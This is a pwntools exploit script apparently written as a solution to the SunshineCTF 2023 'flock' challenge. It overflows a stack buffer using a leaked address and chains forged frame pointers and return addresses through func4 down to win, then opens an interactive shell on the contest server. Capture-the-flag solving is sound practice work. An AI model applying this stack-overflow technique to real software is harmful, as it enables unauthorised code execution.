from pwn import *

context.binary = exe = ELF('./flock')

io = remote('chal.2023.sunshinectf.games', 23002)
#io = process()
#gdb.attach(io, api=True)

io.recvuntil(b'At 0x')
buf = int(io.recvline(keepends=False), 16)

payload = b'\0'*128 + p64(buf+160) + p64(exe.sym['func4']+13) + b'\0'*16 + p64(buf+192) + p64(exe.sym['func3']+13) + b'\0'*16 + p64(buf+224) + p64(exe.sym['func2']+13) + b'\0'*16 + p64(buf+240) + p64(exe.sym['func1']+9) + p64(buf+256) + p64(exe.sym['win']+1)
io.sendlineafter(b'>>> ', payload)
io.interactive()